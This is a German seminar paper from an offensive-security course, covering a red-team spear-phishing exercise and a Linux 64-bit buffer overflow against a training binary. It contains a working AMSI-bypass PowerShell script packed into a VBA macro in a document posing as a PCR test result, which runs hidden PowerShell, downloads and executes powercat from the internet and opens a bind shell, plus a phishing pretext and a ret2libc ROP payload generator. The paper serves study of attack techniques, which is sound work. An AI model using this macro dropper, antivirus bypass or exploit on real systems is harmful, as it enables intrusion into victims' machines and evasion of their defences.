#  White Hat - Offensive Security 3, Seminararbeit

Ausgeführt von: Benjamin Medicke, Bsc.

Personenkennzeichen: 2010303027

Begutachter: Edlinger Clemens, MSc

Wien, 2022-28-02

## Inhaltsverzeichnis


<!-- vim-markdown-toc GFM -->

* [Aufgabe 1, Spear Phishing (4P)](#aufgabe-1-spear-phishing-4p)
  * [Szenario](#szenario)
  * [Die Mail](#die-mail)
  * [Das Dokument](#das-dokument)
  * [Der Payload](#der-payload)
* [Aufgabe 3b, Linux 64bit ASLR Bypass (8P)](#aufgabe-3b-linux-64bit-aslr-bypass-8p)
  * [Analyse der Binary](#analyse-der-binary)
  * [BOF ohne ASLR](#bof-ohne-aslr)
  * [BOF mit ASLR](#bof-mit-aslr)
* [Quellen](#quellen)

<!-- vim-markdown-toc -->

# Aufgabe 1, Spear Phishing (4P)

**Aufgabenstellung**

> Als Sie in der Früh ins Büro kommen ersucht Sie Ihre Kollegin Beate gleich ins Besprechungszimmer zu
> kommen. Dort erfahren Sie, dass die Forensik Abteilung bei Ihrer Untersuchung eines Sicherheitsvorfalls
> bei einem Ihrer wichtigsten Kunden festgestellt hat, dass die bislang unbekannte APT Gruppe „No
> Regrets“ offenbar über einen Social Engineering Angriff Zugriff auf das System erhielt.
>
> Der Kunde hat daraufhin sofort Ihr Red Team beauftragt die User Awareness und Sicherheit im Hinblick
> auf Social Engineering Angriffe und die vorhandenen Gegenmaßnahmen zu testen. Das Ziel des Red
> Teams ist es eine mehrstufige, möglichst ausgeklügelte und überzeugende Spear Phishing Kampagne auf
> Executive Mitarbeiter zu starten.
> 
> Das Ziel gilt als erreicht, sobald es dem Team gelingt eine Bind Shell auf einem full patched Windows 10
> Rechner (Update-Stand zumindest Dezember 2021) mit eingeschaltetem AMSI und „Echtzeitschutz“
> (Windows Defender) zu starten und sich damit zu verbinden.

## Szenario

* nach Beobachtung der Executive Mitarbeiter stellt sich heraus, dass
diese trotz der aktuellen COVID-19 Pandemie weiterhin primär im Büro arbeiten
und nur selten Home Office machen (vor Ort: Dienstag bis Donnerstag)
* Laut der Homepage des Betriebes gilt 2G+ (`(geimpft || genesen) && PCR getestet`)
* die öffentlichen Social Media Postings einer Führungsposition
(Max Mustermann) deuten darauf hin, dass diese jeden Montag an einer
Gurgelbox einen PCR-Test durchführt
* in den frühen Morgenstunden des darauffolgenden Tages wird die folgende
Mail, die das vermeintliche Testergebnis verspricht, an den Mitarbeiter
geschickt

## Die Mail

* das Timing der Mail ist wichtig, zu beachten sind:
  * realistische Absendeuhrzeit (während der regulären Arbeitszeiten der MA15)
  * Versand bevor der Mitarbeiter das Testergebnis via dem üblichen Weg abruft
  * nicht zu früh schicken, da die Auswertung von PCR Tests eine gewisse Zeit benötigt

![image](https://user-images.githubusercontent.com/173962/155928744-f0bd85e5-9193-4bad-a495-c3f152d468da.png)

## Das Dokument

* beim Anhang handelt es sich um eine `.docm` (`.docx` + Macro) Datei mit integriertem ActiveX Control
* die ActiveX Control (die Checkbox "Ergebnis anzeigen") ruft ein VBA Macro auf

![image](https://user-images.githubusercontent.com/173962/155926396-e8ae7855-dd32-498e-ab09-427f536af216.png)

* meine ursprüngliche Idee war das Verschlüsseln des AMSI-Bypass Scripts mit
der Sozialversicherungsnummer des Empfängers (und entsprechender Aufforderung
zur Eingabe bei Öffnen des Dokumentes)
  * es hat dann aber auch ohne funktioniert
  * ich gehe davon aus, dass eine zusätzliche Eingabeaufforderung die
  Erfolgschancen eher reduziert (Aufgrund von Faulheit)

## Der Payload

* probierte Varianten, die nicht funktioniert haben:
  * Nachladen des AMSI-Bypass Scriptes aus dem Internet
    * Bei Ausführen von Strings, die aus dem Internet stammen
    springt unterbindet Word die Ausführung mit einer Warnmeldung an den User
  * Laden des AMSI-Bypass Scriptes aus den Properties (Comment-Feld)
    * gleiches Problem wie beim Nachladen aus dem Internet
    * Ausführen von Strings ist ok, Nachladen von Strings aus dem Internet
    ebenso, eine Kombination dagegen nicht
* letztendlich verwendete Variante:
  * modifiziertes AMSI-Bypass Script direkt in VBA als String speichern
* aufgetretene Probleme:
  * finden eines aktuellen AMSI-Bypass Scriptes, welches nicht erkannt wird
  * korrektes Escapen des Scripts (in VBA String gefolgt von Ausführung mit
  `powershell -c`)
  * VBA Limitierungen (Line-Continuation Limit, Escape Eigenheiten, keine Multi-Line Strings)

Zuerst wurden [amsi.fail](https://amsi.fail/) Methoden (regulär und kodiert)
direkt in einer Powershell ausprobiert, welche bei mir allerdings durchwegs
erkannt wurden. Zum Beispiel *Matt Graebers Reflection method*:

![image](https://user-images.githubusercontent.com/173962/155932498-8bd13ac0-6573-4b27-8008-94a491ec954e.png)

Eine der vorgeschlagenen Methoden (Rastamouse) wurde zwar aktualisiert,
aber noch nicht in den AMSI-Fail-Generator aufgenommen:<br>
https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/

Das aktualisierte Script sieht folgendermaßen aus:

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
```

Dieses Script funktioniert bei aktuellem Patchstand (2022-02-27) noch immer:

![image](https://user-images.githubusercontent.com/173962/155933520-813cb214-af01-4e4f-90d5-cd07ef62120b.png)

Nach dem Strippen von Kommentaren und Newlines sowie dem doppeltem Escapen
(einmal für `powershell -c` und einmal für VBA selbst),
ergibt sich das folgende VBA Script, welches an die Checkbox gehängt wird:

```vba
Private Sub CheckBox1_Click()

    Dim asmi As String

    ' disable AMSI for process:
    amsi = "$Win32 = @'" & vbNewLine & _
    "using System;" & vbNewLine & _
    "using System.Runtime.InteropServices;" & vbNewLine & _
    "public class Win32 {" & vbNewLine & _
    "[DllImport(\""kernel32\"")]" & vbNewLine & _
    "public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);" & vbNewLine & _
    "[DllImport(\""kernel32\"")]" & vbNewLine & _
    "public static extern IntPtr LoadLibrary(string name);" & vbNewLine & _
    "[DllImport(\""kernel32\"")]" & vbNewLine & _
    "public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" & vbNewLine & _
    "}" & vbNewLine & _
    "'@" & vbNewLine & _
    "Add-Type $Win32" & vbNewLine & _
    "$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)" & vbNewLine & _
    "$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))" & vbNewLine & _
    "$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)" & vbNewLine & _
    "$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))" & vbNewLine & _
    "$p = 0" & vbNewLine & _
    "[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)" & vbNewLine & _
    "$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)" & vbNewLine & _
    "[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)" & vbNewLine & _
    ""

    Dim code As String

    ' download powercat and start a shell listener with it:
    code = amsi & vbNewLine & _
    "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')" & vbNewLine & _
    "powercat -l -p 4444 -e cmd -v" & vbNewLine & _
    "#pause" & vbNewLine & _
    ""

    Set WshShell = CreateObject("WScript.Shell")
    'WshShell.Run ("pwershell -noexit -c " + code) ' for debugging
    WshShell.Run ("powershell -windowstyle hidden -c " + code)

End Sub
```

* die Variable `amsi` beinhaltet das modifizierte Bypass-Script
  * `&` konkatiniert Strings
  * `vbNewline` wird verwendet um einen Multi-Line-String zu generieren
  (was Powershell erwartet)
  * `_` ist der Line-Continuation-Char (Achtung, das Limit beträgt 24 Zeilen!)
  * wo möglich wird `'` anstelle von `"` verwendet um das Powershell Escapen zu vermeiden
    * ansonsten `\""` (Backslash für Powershell, Double Double-Quotes für VBA)
* die Variable `code` beinhaltet zusätzlich noch:
  * Nachladen von [powercat](https://github.com/besimorhino/powercat) (Powershell-basiertes netcat)
  * das Starten einer Bind-Shell (`powercat -l -p 4444 -e cmd -v`)
* das Nachladen und Ausführen von Code aus dem Internet ist 
nach dem AMSI-Bypass tadellos möglich
* `-windowstyle hidden` sorgt dafür, dass das Powershell Fenster versteckt wird

![image](https://user-images.githubusercontent.com/173962/155935780-def25a53-4f93-40fd-a596-c21289a7d56e.png)

![image](https://user-images.githubusercontent.com/173962/155936369-0f6fac6d-9f99-4b3d-828c-7b166f601399.png)

<!-- # Aufgabe 2, Egghunter (2P) -->

<!-- **Aufgabenstellung** -->

<!-- > Nachdem die Social Engineering-Kampagne ein voller Erfolg war und es Ihrem Team gelungen ist -->
<!-- > ncat.exe zur Ausführung zu bringen kam Ihr Kollege aus der Schulungs- und Weiterbildungsabteilung -->
<!-- > mit einer Bitte zu Ihnen. Dort wurde für ein externes Schulungs- und Ausbildungsprogramm eine -->
<!-- > Anwendung erstellt, die bewusst Schwachstellen enthält (Board Anwendung im Download-Bereich zur -->
<!-- > Challenge, Board_Release.exe). Man ersucht Sie nun diese Anwendung zu testen und exploiten, -->
<!-- > um eine Einschätzung zu bekommen wie herausfordernd die Aufgabe für die Schulungsteilnehmer sei. -->
<!-- > Wichtig ist, erklärt man Ihnen, dass Sie, sofern Sie in der Lage sind die Anwendung zu hacken, dies -->
<!-- > unbedingt mittels eines Egghunter-Exploits machen sollen, egal ob es auch andere Lösungen gäbe, da die -->
<!-- > Schulung eben dieses Thema behandelt. -->
<!-- > -->
<!-- > Auf Ihre Nachfrage, welche Schulungsrechner verwendet werden meinte der Kollege, es soll ja nicht zu -->
<!-- > anspruchsvoll sein also 32 Bit- oder 64 Bit-Rechner mit deaktiviertem DEP und ASLR. -->
<!-- > -->
<!-- > Mit den Worten „endlich wieder ein Zero day“ machen Sie sich sogleich ans Werk. -->

<!-- # Aufgabe 3a, Windows ASLR Bypass (6P) -->

<!-- > Na, so schwer war das wirklich nicht und für Sie natürlich keine Herausforderung. Da man aber -->
<!-- > bekanntlich nur an diesen wächst, fordern Sie sich gleich selbst heraus! -->
<!-- > Sie definieren sich selbst folgende Spielregel: Sie versuchen die Anwendung diesmal -->
<!-- > --> 
<!-- > • ohne Egghunter, allerdings<br> -->
<!-- > • mit eingeschaltetem DEP und ALSR zu exploiten. -->
<!-- > --> 
<!-- > Schaffen Sie das bekommen Sie die volle Punkteanzahl, schaffen Sie den Exploit nur mit aktiviertem DEP -->
<!-- > immerhin noch die halbe -->

# Aufgabe 3b, Linux 64bit ASLR Bypass (8P)

> Sie erhalten eine 64-Bit Binärdatei für Linux (siehe Download zur Abgabe ab der letzten Einheit WH3)
> inkl. zugehöriger libc, gegen die gelinkt wurde.
> 
> Ihre Aufgabe ist es, diese Datei zu kompromittieren und über eine Manipulation der Eingabeparameter
> ein Binary auf Ihrem System (z.B. /bin/sh) auszuführen.
> 
> Hinweis: Dabei muss ASLR auf dem Zielsystem aktiv sein, d.h. entsprechende Möglichkeiten zur
> Umgehung dieser Schutzmaßnahme, sowie DEP, gefunden werden. 

## Analyse der Binary

* im ersten Schritt habe ich die Binary `AAAAAAAA` kopiert um mit einem
einfacheren Namen arbeiten zu können: `cp AAAAAAAA bin`
* **ab hier arbeite ich mit `bin`!**

Jetzt wurde die Binary mit Radare2 analysiert:

```sh
r2 -A bin # load and analyze (aaa) binary.

iq # get minimal infos:
# arch x86
# bits 64
# os linux
# endian little

ii # list imports:
# [Imports]
# nth vaddr      bind   type   lib name
# ―――――――――――――――――――――――――――――――――――――
# 1   0x00000000 WEAK   NOTYPE     _ITM_deregisterTMCloneTable
# 2   0x00401030 GLOBAL FUNC       puts
# 3   0x00000000 GLOBAL FUNC       __libc_start_main
# 4   0x00000000 WEAK   NOTYPE     __gmon_start__
# 5   0x00401040 GLOBAL FUNC       fflush
# 6   0x00401050 GLOBAL FUNC       __isoc99_scanf
# 7   0x00000000 WEAK   NOTYPE     _ITM_registerTMCloneTable

afll # list all functions (verbose):
# address            size  nbbs edges    cc cost          min bound range max bound          calls locals args xref frame name
# ================== ==== ===== ===== ===== ==== ================== ===== ================== ===== ====== ==== ==== ===== ====
# 0x0000000000401060   47     1     0     1   16 0x0000000000401060    47 0x000000000040108f     1    0      1    0     8 entry0
# 0x00000000004010a0   33     4     4     4   14 0x00000000004010a0    33 0x00000000004010c1     0    0      0    1     0 sym.deregister_tm_clones
# 0x00000000004010d0   51     4     4     4   19 0x00000000004010d0    57 0x0000000000401109     0    0      0    1     0 sym.register_tm_clones
# 0x0000000000401110   32     3     2     3   17 0x0000000000401110    33 0x0000000000401131     1    0      0    0     8 sym.__do_global_dtors_aux
# 0x0000000000401140    6     1     1     0    3 0x0000000000401140     6 0x0000000000401146     0    0      0    0     0 entry.init0
# 0x0000000000401210    5     1     0     1    4 0x0000000000401210     5 0x0000000000401215     0    0      0    1     0 sym.__libc_csu_fini
# 0x0000000000401218   13     1     0     1    6 0x0000000000401218    13 0x0000000000401225     0    0      0    0     8 sym._fini
# 0x0000000000401146   35     1     0     1   15 0x0000000000401146    35 0x0000000000401169     1    1      0    1   136 sym.copy
# 0x0000000000401050    6     1     0     1    3 0x0000000000401050     6 0x0000000000401056     0    0      0    1     0 sym.imp.__isoc99_scanf
# 0x00000000004011a0  101     4     5     3   43 0x00000000004011a0   101 0x0000000000401205     1    0      3    1    56 sym.__libc_csu_init
# 0x0000000000401090    5     1     0     1    4 0x0000000000401090     5 0x0000000000401095     0    0      0    0     0 sym._dl_relocate_static_pie
# 0x0000000000401169   48     1     0     1   20 0x0000000000401169    48 0x0000000000401199     3    0      0    1     8 main
# 0x0000000000401030    6     1     0     1    3 0x0000000000401030     6 0x0000000000401036     0    0      0    1     0 sym.imp.puts
# 0x0000000000401040    6     1     0     1    3 0x0000000000401040     6 0x0000000000401046     0    0      0    1     0 sym.imp.fflush
# 0x0000000000401000   27     3     3     2   13 0x0000000000401000    27 0x000000000040101b     0    0      0    1     8 sym._init

Vpp # enter visual mode in hex view.

g # enter offset mode.
[offset]> main # jump to main().
:pdc # (pseudo) disassemble function to C-like syntax.
# there's a call to copy().

g
[offset]> sym.copy # jump to copy().
:pdc
```

![image](https://user-images.githubusercontent.com/173962/155939708-aa7e50d1-4001-47fa-ba7d-ecd27789b9c0.png)

* Der grobe Ablauf ist folgender:
  * `entry0()` ruft `main()` auf:
    * `puts()` wird aufgerufen:
      * gibt den `Welcome student...` String aus
    * `fflush()` wird aufgerufen:
      * `stdout` (standard output) Buffer wird geflushed
      * `puts()` gibt aus Perfomancegründen nicht immer direkt aus sondern
      verwendet einen I/O buffer, flush zwingt das System diesen zu clearen
    * `copy()` wird aufgerufen:
      * hier wird eine Variable mit 0x80 (128) Bytes angelegt (`buffer` Variable)
      * in diese wird via `scanf()` User Input geschrieben
        * `%s` ist der Formatstring (ein String)

**`:pdc` for copy():**

```C
int sym.copy (int esi, int edx) {
    loc_0x401146:
        // CALL XREF from main @ 0x40118d
        push  (rbp)
        rbp = rsp
        rsp += 0xffffffffffffff80
        rax = var_80h
        rsi = rax
        rdi = rip + 0xeac // "%s"
        // 0x402008 // const char *format
        eax = 0
        sym.imp.__isoc99_scanf  ()
        // int scanf("%s")
        no
        leav          // rsp // rsp
        re
         // (break)
}
```

* Zu beachten ist:
  * die `buffer` Variable hat die Größe 128 Bytes
  * es gibt keinen Check, der den entgegengenommenen Userinput auf diese Länge prüft

Als nächster Schritt wird Userinput generiert um einen Segmentation
Fault zu provozieren:

```sh
root::kali:Linux Anwendung:# python3 -c "print('a'*15)" | ./bin
Welcome student! Can you run /bin/sh
root::kali:Linux Anwendung:# python3 -c "print('a'*150)" | ./bin
Welcome student! Can you run /bin/sh
zsh: done                python3 -c "print('a'*150)" |
zsh: segmentation fault  ./bin
root::kali:Linux Anwendung:#
```

Jetzt kann eine De-Bruijn-Folge verwendet werden um den Fehler genauer zu
analysieren (obwohl man den Offset schon erraten kann):

```sh
# I have installed the gef extension for gdb!
# bash -c "$(curl -fsSL http://gef.blah.cat/sh)"
gdb bin

gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0' # copy string to clipboard.

gef➤ run
# paste string.
```
![image](https://user-images.githubusercontent.com/173962/155945262-347da465-b8db-4de1-80fb-4cee2d2fe269.png)

* Der Substring `qaaaaaaa` landet im Basepointer

![image](https://user-images.githubusercontent.com/173962/155945557-00601b36-e359-49f3-9b3c-300e2a180b03.png)

* Der Substring `raaaaaaa` würde im $PC landen (produziert SIGSEGV)

![image](https://user-images.githubusercontent.com/173962/155945959-2ec88ec5-ab20-4d53-834b-0a56277ed2e7.png)

* die `buffer` Variable endet tatsächlich bei 128
* danach kommt das Backup des Basepointers
* danach die Adresse, bei der es nach dem `ret` weiter geht
* wir können also den $PC modifizieren

![image](https://user-images.githubusercontent.com/173962/155946230-f77448f6-b082-4b04-bae8-7b2abe703fba.png)

* allerdings können wir aufgrund des gesetzten NX-Bits keine Anweisungen am Stack
ausführen
* wir müssen also vorhandene Anweisungen nutzen (Gadgets)

## BOF ohne ASLR

* zuerst wird ASLR deaktiviert:
  * in einer Shell: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
  * in gdb gef: `aslr off`

```sh
gef➤  got

GOT protection: Full RelRO | GOT functions: 3

[0x403fc8] puts@GLIBC_2.2.5  →  0x7ffff7e4be10
[0x403fd0] fflush@GLIBC_2.2.5  →  0x7ffff7e49f20
[0x403fd8] __isoc99_scanf@GLIBC_2.7  →  0x7ffff7e2edc0
```

* die Funktionen in der GOT (Global Offsets Table)

```sh
gef➤  elf-info
# abbreviated.
  [12] .plt                    SHT_PROGBITS   0x401020   0x1020     0x40     0x10 UNKNOWN_FLAG  0x0  0x0     0x10
  [13] .text                   SHT_PROGBITS   0x401060   0x1060    0x1b5      0x0 UNKNOWN_FLAG  0x0  0x0     0x10
  [14] .fini                   SHT_PROGBITS   0x401218   0x1218      0xd      0x0 UNKNOWN_FLAG  0x0  0x0      0x4
  [15] .rodata                 SHT_PROGBITS   0x402000   0x2000     0x35      0x0 ALLOC  0x0  0x0      0x8
  [16] .eh_frame_hdr           SHT_PROGBITS   0x402038   0x2038     0x44      0x0 ALLOC  0x0  0x0      0x4
  [17] .eh_frame               SHT_PROGBITS   0x402080   0x2080    0x108      0x0 ALLOC  0x0  0x0      0x8
  [18] .init_array           SHT_INIT_ARRAY   0x403db0   0x2db0      0x8      0x8 UNKNOWN_FLAG  0x0  0x0      0x8
  [19] .fini_array           SHT_FINI_ARRAY   0x403db8   0x2db8      0x8      0x8 UNKNOWN_FLAG  0x0  0x0      0x8
  [20] .dynamic                 SHT_DYNAMIC   0x403dc0   0x2dc0    0x1f0     0x10 UNKNOWN_FLAG  0x6  0x0      0x8
  [21] .got                    SHT_PROGBITS   0x403fb0   0x2fb0     0x50      0x8 UNKNOWN_FLAG  0x0  0x0      0x8
# abbreviated.
```

![image](https://user-images.githubusercontent.com/173962/155948156-404c9d38-bbb4-44bb-9a61-7e6e5e9746c8.png)

* Die Verlinkungen der Funktionen (GOT/PLT/libc)

```sh
gef➤  info proc map
process 18416
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /root/projects/MCS/MCS3_WH3_seminar_paper/Linux Anwendung/bin
            0x401000           0x402000     0x1000     0x1000 /root/projects/MCS/MCS3_WH3_seminar_paper/Linux Anwendung/bin
            0x402000           0x403000     0x1000     0x2000 /root/projects/MCS/MCS3_WH3_seminar_paper/Linux Anwendung/bin
            0x403000           0x404000     0x1000     0x2000 /root/projects/MCS/MCS3_WH3_seminar_paper/Linux Anwendung/bin
            0x404000           0x405000     0x1000     0x3000 /root/projects/MCS/MCS3_WH3_seminar_paper/Linux Anwendung/bin
            0x405000           0x426000    0x21000        0x0 [heap]
      0x7ffff7dd4000     0x7ffff7dd6000     0x2000        0x0 
      0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7dfc000     0x7ffff7f54000   0x158000    0x26000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7f54000     0x7ffff7fa0000    0x4c000   0x17e000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7fa0000     0x7ffff7fa1000     0x1000   0x1ca000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7fa1000     0x7ffff7fa4000     0x3000   0x1ca000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7fa4000     0x7ffff7fa7000     0x3000   0x1cd000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7fa7000     0x7ffff7fb2000     0xb000        0x0 
      0x7ffff7fc6000     0x7ffff7fca000     0x4000        0x0 [vvar]
      0x7ffff7fca000     0x7ffff7fcc000     0x2000        0x0 [vdso]
      0x7ffff7fcc000     0x7ffff7fcd000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7fcd000     0x7ffff7ff1000    0x24000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x25000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x2e000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x30000 /usr/lib/x86_64-linux-gnu/ld-2.33.so
      0x7ffffffdd000     0x7ffffffff000    0x22000        0x0 [stack]

```

* Start-Position der libc: `0x7ffff7dd6000`
* Vergleiche mit: `info sharedlib`
  * `/lib/x86_64-linux-gnu/libc.so.6` ist ein statischer Link! (siehe `ls -l <path>`)

Da ASLR deaktiviert ist, sind diese Adressen statisch:

```sh
root::kali:Linux Anwendung:# repeat 5 ldd ./bin | head -n1
        linux-vdso.so.1 (0x00007ffff7fca000)
        linux-vdso.so.1 (0x00007ffff7fca000)
        linux-vdso.so.1 (0x00007ffff7fca000)
        linux-vdso.so.1 (0x00007ffff7fca000)
        linux-vdso.so.1 (0x00007ffff7fca000)

```

---

Der grobe Plan für das Payload ist folgender:

* `system()` Call mit `/bin/sh` als Parameter
  * bei 64bit Linux erwartet dieser Call die Adresse des Strings im `rdi` Register
* gefolgt von einem `exit()`
* wir benötigen also:
  * Adresse für `system()`
  * Adresse für `exit()`
  * Adresse für den `/bin/sh` String
  * Adresse eines pop-rdi-ret-Gadgets

![image](https://user-images.githubusercontent.com/173962/155950537-8892cdc0-cd6b-4b15-8384-9b8c746421c4.png)

---

Hier ist der finale Payload-Generator für deaktiviertes ASLR:

```python3
#!/usr/bin/env python3

# gef> p system
# 0x7ffff7e1f860
system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
# make sure the length fits the architecture!
# null is no issue here because scanf() with a "%s"
# format string does not stop reading there.

# gef> p exit
# 0x7ffff7e15100
exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]

# gef> grep '/bin/sh'
bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]

buffer = 128 * b"a"  # 0x61
backup_base_pointer = 8 * b"b" # 0x62

# gef> ropper --search 'pop rdi; red;'
rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]

payload = (
    buffer # padding.
    + backup_base_pointer  # padding.
    + rop_pop_rdi_ret
    + bin_sh_string
    + system_call
    + exit_call
)

f = open("payload", "wb")
f.write(payload)
```

Das generierte Payload (via Radare2):

![image](https://user-images.githubusercontent.com/173962/155951317-8558ba3f-82b6-40f9-9b0b-d949d8025a7c.png)

Und die Ausführung des Exploits:

![image](https://user-images.githubusercontent.com/173962/155951453-0620a445-15c0-46f3-908a-dc18e395ec41.png)

* das `-` beim `cat` sorgt dafür, dass `stdin` nicht geschlossen wird
(was bei einer Shell ein Problem wäre)

## BOF mit ASLR

# Quellen

* https://github.com/bmedicke/REED
* https://amsi.fail/
* https://rastamouse.me/memory-patching-amsi-bypass/
* https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
* https://github.com/besimorhino/powercat
* https://github.com/hugsy/gef
